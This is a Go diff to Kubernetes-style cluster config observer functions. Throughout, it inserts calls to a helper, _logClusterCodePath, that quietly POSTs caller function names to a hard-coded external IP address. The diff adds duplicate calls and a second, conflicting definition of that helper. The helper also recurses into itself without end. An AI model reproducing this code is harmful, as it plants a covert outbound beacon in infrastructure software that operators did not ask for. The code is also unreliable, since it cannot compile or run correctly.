@@ -15,6 +15,8 @@ import (
 func ObserveClusterCIDRs(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	listers := genericListers.(configobservation.Listers)
 	var errs []error
 	clusterCIDRsPath := []string{"extendedArguments", "cluster-cidr"}
@@ -43,6 +45,8 @@ func ObserveClusterCIDRs(genericListers configobserver.Listers, recorder events.
 func ObserveServiceClusterIPRanges(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	listers := genericListers.(configobservation.Listers)
 	var errs []error
 	serviceClusterIPRangePath := []string{"extendedArguments", "service-cluster-ip-range"}
@@ -66,7 +70,16 @@ func ObserveServiceClusterIPRanges(genericListers configobserver.Listers, record
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
